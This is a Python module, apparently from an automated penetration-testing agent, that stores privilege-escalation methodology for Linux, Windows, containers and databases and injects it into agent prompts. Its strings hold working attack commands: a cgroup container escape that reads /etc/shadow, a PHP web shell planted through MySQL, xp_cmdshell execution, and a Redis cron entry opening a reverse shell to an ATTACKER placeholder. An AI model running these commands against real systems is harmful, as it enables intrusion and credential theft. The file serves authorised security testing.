"""Privilege escalation knowledge base — Linux and Windows privesc.

Deep knowledge about privilege escalation techniques:
1. Linux privilege escalation
2. Windows privilege escalation
3. Container escape
4. Database privilege escalation
5. Application-level privilege escalation
"""

from __future__ import annotations

from collections import defaultdict
from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class PrivescPattern:
    """A privilege escalation pattern with methodology."""
    pattern_id: str = ""
    name: str = ""
    platform: str = ""            # linux, windows, container, database
    severity: str = "critical"
    description: str = ""
    testing_methodology: str = ""
    tools: list[str] = field(default_factory=list)
    mitre_technique: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:30],
            "platform": self.platform[:10],
            "mitre": self.mitre_technique[:12],
        }


PRIVESC_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "pe-001", "name": "Linux Privilege Escalation",
        "platform": "linux", "severity": "critical",
        "mitre": "T1548",
        "desc": "Linux local privilege escalation techniques.",
        "testing": (
            "LINUX PRIVILEGE ESCALATION:\n"
            "1. SUID/SGID BINARIES:\n"
            "   find / -perm -4000 -type f 2>/dev/null  # SUID\n"
            "   find / -perm -2000 -type f 2>/dev/null  # SGID\n"
            "   Cross-reference with GTFOBins: https://gtfobins.github.io/\n"
            "   Common exploitable: find, vim, python, perl, nmap, less, awk\n"
            "2. SUDO MISCONFIGURATIONS:\n"
            "   sudo -l  # List allowed commands\n"
            "   Exploitable patterns:\n"
            "   - (ALL) NOPASSWD: ALL → instant root\n"
            "   - env_keep += LD_PRELOAD → LD_PRELOAD hijacking\n"
            "   - Wildcard in path: /usr/bin/* → path traversal\n"
            "   - Specific commands: Check GTFOBins for sudo abuse\n"
            "   - sudo version < 1.8.28 → CVE-2019-14287 (sudo -u#-1 bash)\n"
            "3. KERNEL EXPLOITS:\n"
            "   uname -a  # Check kernel version\n"
            "   Notable: DirtyPipe (CVE-2022-0847, 5.8-5.16.11),\n"
            "   DirtyCow (CVE-2016-5195, < 4.8.3),\n"
            "   PwnKit (CVE-2021-4034, polkit),\n"
            "   Looney Tunables (CVE-2023-4911, glibc)\n"
            "   linux-exploit-suggester.sh or linux-exploit-suggester-2.pl\n"
            "4. CRON JOBS:\n"
            "   cat /etc/crontab\n"
            "   ls -la /etc/cron.*\n"
            "   crontab -l\n"
            "   Writable cron scripts? PATH manipulation in cron?\n"
            "   Wildcard injection: tar with --checkpoint\n"
            "5. CAPABILITIES:\n"
            "   getcap -r / 2>/dev/null\n"
            "   Dangerous: cap_setuid, cap_setgid, cap_dac_override,\n"
            "   cap_net_raw, cap_sys_admin, cap_sys_ptrace\n"
            "   Python with cap_setuid: import os; os.setuid(0); os.system('/bin/bash')\n"
            "6. WRITABLE FILES:\n"
            "   - /etc/passwd (add root user)\n"
            "   - /etc/shadow (replace root hash)\n"
            "   - /etc/sudoers\n"
            "   - Shared library paths (LD hijacking)\n"
            "   - systemd service files\n"
            "7. AUTOMATED:\n"
            "   linPEAS.sh, LinEnum.sh, linux-smart-enumeration"
        ),
        "tools": ["linPEAS", "LinEnum", "pspy", "linux-exploit-suggester"],
    },
    {
        "id": "pe-002", "name": "Windows Privilege Escalation",
        "platform": "windows", "severity": "critical",
        "mitre": "T1548,T1134",
        "desc": "Windows local privilege escalation techniques.",
        "testing": (
            "WINDOWS PRIVILEGE ESCALATION:\n"
            "1. SERVICE MISCONFIGURATIONS:\n"
            "   - Unquoted service paths:\n"
            "     wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\"\n"
            "     If path has spaces without quotes → binary planting\n"
            "   - Weak service permissions:\n"
            "     accesschk.exe -uwcqv * /accepteula\n"
            "     SERVICE_CHANGE_CONFIG → replace binary\n"
            "   - Service binary permissions:\n"
            "     icacls C:\\path\\to\\service.exe\n"
            "     Writable? Replace with reverse shell\n"
            "2. REGISTRY AUTORUNS:\n"
            "   reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n"
            "   If target binary is writable → replace with payload\n"
            "   AlwaysInstallElevated:\n"
            "   reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n"
            "   reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n"
            "   Both = 1 → Any MSI installs as SYSTEM\n"
            "3. TOKEN MANIPULATION:\n"
            "   - SeImpersonatePrivilege → Potato attacks\n"
            "     JuicyPotato, PrintSpoofer, GodPotato, SweetPotato\n"
            "   - SeBackupPrivilege → Read any file (SAM, SYSTEM)\n"
            "   - SeRestorePrivilege → Write any file\n"
            "   - SeTakeOwnershipPrivilege → Own any file\n"
            "   - SeLoadDriverPrivilege → Load kernel driver\n"
            "4. DLL HIJACKING:\n"
            "   - Missing DLLs in search path\n"
            "   - procmon.exe: Filter for NAME NOT FOUND + .dll\n"
            "   - Place malicious DLL in writable search path\n"
            "5. UAC BYPASS:\n"
            "   - Auto-elevate binaries: fodhelper.exe, eventvwr.exe\n"
            "   - Environment variable: windir manipulation\n"
            "   - DLL side-loading via trusted process\n"
            "6. AUTOMATED:\n"
            "   winPEAS.exe, PowerUp.ps1, Seatbelt.exe, SharpUp.exe"
        ),
        "tools": ["winPEAS", "PowerUp", "Seatbelt", "SharpUp", "accesschk"],
    },
    {
        "id": "pe-003", "name": "Container Privilege Escalation",
        "platform": "container", "severity": "critical",
        "mitre": "T1611",
        "desc": "Container escape and privilege escalation.",
        "testing": (
            "CONTAINER PRIVILEGE ESCALATION:\n"
            "1. DETECT CONTAINER:\n"
            "   - Check /.dockerenv or /run/.containerenv\n"
            "   - cat /proc/1/cgroup | grep -i docker\n"
            "   - hostname → random string usually means container\n"
            "2. PRIVILEGED CONTAINER:\n"
            "   - Check: cat /proc/self/status | grep CapEff\n"
            "   - CapEff: 000001ffffffffff = all capabilities = privileged\n"
            "   - Mount host filesystem:\n"
            "     mkdir /mnt/host && mount /dev/sda1 /mnt/host\n"
            "     chroot /mnt/host → root on host\n"
            "3. DOCKER SOCKET:\n"
            "   - ls -la /var/run/docker.sock\n"
            "   - If accessible: docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host\n"
            "   - curl --unix-socket /var/run/docker.sock http://localhost/containers/json\n"
            "4. CAPABILITIES ABUSE:\n"
            "   - CAP_SYS_ADMIN:\n"
            "     Mount cgroup: release_agent RCE\n"
            "     d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -1))\n"
            "     mkdir -p $d/exploit && echo 1 > $d/exploit/notify_on_release\n"
            "     echo '#!/bin/bash' > /cmd && echo 'cat /etc/shadow > /output' >> /cmd\n"
            "     host_path=$(sed -n 's/.*upperdir=\\([^,]*\\).*/\\1/p' /etc/mtab)\n"
            "     echo \"$host_path/cmd\" > $d/exploit/release_agent\n"
            "   - CAP_NET_RAW: Packet sniffing on host network\n"
            "   - CAP_SYS_PTRACE: Attach to host processes\n"
            "5. KERNEL EXPLOITS:\n"
            "   - Container shares kernel with host\n"
            "   - DirtyPipe, DirtyCow work from container too\n"
            "6. SENSITIVE MOUNTS:\n"
            "   - /proc/sysrq-trigger\n"
            "   - /sys/kernel/uevent_helper\n"
            "   - /dev with raw disk access"
        ),
        "tools": ["deepce", "CDK", "amicontained"],
    },
    {
        "id": "pe-004", "name": "Database Privilege Escalation",
        "platform": "database", "severity": "high",
        "mitre": "T1505",
        "desc": "Database-specific privilege escalation techniques.",
        "testing": (
            "DATABASE PRIVILEGE ESCALATION:\n"
            "1. MySQL/MariaDB:\n"
            "   - UDF (User Defined Functions):\n"
            "     Create function sys_exec from shared library\n"
            "     SELECT sys_exec('id > /tmp/out')\n"
            "   - FILE privilege → read/write files:\n"
            "     SELECT LOAD_FILE('/etc/passwd')\n"
            "     SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/shell.php'\n"
            "   - CVE-2016-6662: MySQL remote root via malloc_lib\n"
            "   - MySQL running as root? → direct system access\n"
            "2. PostgreSQL:\n"
            "   - COPY command → read/write files (superuser required)\n"
            "     COPY (SELECT '') TO PROGRAM 'id'\n"
            "   - pg_execute_server_program (v9.3+)\n"
            "   - Large objects → read arbitrary files:\n"
            "     SELECT lo_import('/etc/passwd')\n"
            "   - Extensions: plpythonu, plperlu → code execution\n"
            "     CREATE EXTENSION plpythonu;\n"
            "     CREATE FUNCTION exec() RETURNS text AS $$\n"
            "       import os; return os.popen('id').read()\n"
            "     $$ LANGUAGE plpythonu;\n"
            "3. MSSQL:\n"
            "   - xp_cmdshell (disabled by default, can re-enable if sysadmin):\n"
            "     EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\n"
            "     EXEC xp_cmdshell 'whoami'\n"
            "   - OPENROWSET / linked servers → pivot to other databases\n"
            "   - Impersonation: EXECUTE AS LOGIN = 'sa'\n"
            "   - CLR assembly → custom .NET code execution\n"
            "4. Redis:\n"
            "   - No auth by default! Check: redis-cli -h target\n"
            "   - Write to crontab:\n"
            "     CONFIG SET dir /var/spool/cron/\n"
            "     CONFIG SET dbfilename root\n"
            "     SET payload '\\n*/1 * * * * /bin/bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\\n'\n"
            "     SAVE\n"
            "   - Write SSH key → authorized_keys\n"
            "   - Module loading (Redis 4.0+): MODULE LOAD /path/to/module.so"
        ),
        "tools": ["sqlmap", "redis-cli", "mssqlclient.py"],
    },
]


class PrivescKB:
    """Privilege escalation knowledge base.

    Provides deep privesc methodology injected into
    agent prompts for post-exploitation assessment.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, PrivescPattern] = {}
        self._log = logger.bind(component="privesc_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load privesc patterns."""
        for data in PRIVESC_PATTERNS:
            pattern = PrivescPattern(
                pattern_id=data["id"],
                name=data["name"],
                platform=data.get("platform", ""),
                severity=data.get("severity", "critical"),
                description=data.get("desc", ""),
                testing_methodology=data.get("testing", ""),
                tools=data.get("tools", []),
                mitre_technique=data.get("mitre", ""),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_patterns_for_platform(
        self,
        platform: str,
    ) -> list[PrivescPattern]:
        """Get patterns by platform."""
        return [
            p for p in self._patterns.values()
            if p.platform == platform
        ]

    def get_testing_prompts(
        self,
        platforms: list[str] | None = None,
        max_patterns: int = 3,
    ) -> list[str]:
        """Get testing prompts for agent context injection."""
        prompts = []
        for pattern in self._patterns.values():
            if platforms and pattern.platform not in platforms:
                continue
            if pattern.testing_methodology:
                prompts.append(pattern.testing_methodology)
            if len(prompts) >= max_patterns:
                break
        return prompts

    def detect_platform(self, text: str) -> str:
        """Detect target platform from context."""
        text_lower = text.lower()
        if any(kw in text_lower for kw in ["linux", "ubuntu", "centos", "debian", "rhel", "fedora"]):
            return "linux"
        if any(kw in text_lower for kw in ["windows", "win32", "powershell", "cmd.exe"]):
            return "windows"
        if any(kw in text_lower for kw in ["docker", "container", "kubernetes", "k8s"]):
            return "container"
        if any(kw in text_lower for kw in ["mysql", "postgres", "mssql", "redis", "mongodb"]):
            return "database"
        return ""

    def build_privesc_prompt(
        self,
        platform: str = "",
        max_patterns: int = 2,
    ) -> str:
        """Build privesc testing prompt."""
        relevant = []
        if platform:
            relevant = self.get_patterns_for_platform(platform)
        else:
            relevant = list(self._patterns.values())

        lines = ["## Privilege Escalation Testing\n"]
        for pattern in relevant[:max_patterns]:
            lines.append(f"### {pattern.name} [{pattern.severity.upper()}]")
            if pattern.mitre_technique:
                lines.append(f"MITRE ATT&CK: {pattern.mitre_technique}")
            lines.append(pattern.testing_methodology)
            lines.append("")

        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        plat_counts: dict[str, int] = defaultdict(int)
        for p in self._patterns.values():
            plat_counts[p.platform] += 1
        return {
            "patterns": len(self._patterns),
            "by_platform": dict(plat_counts),
        }
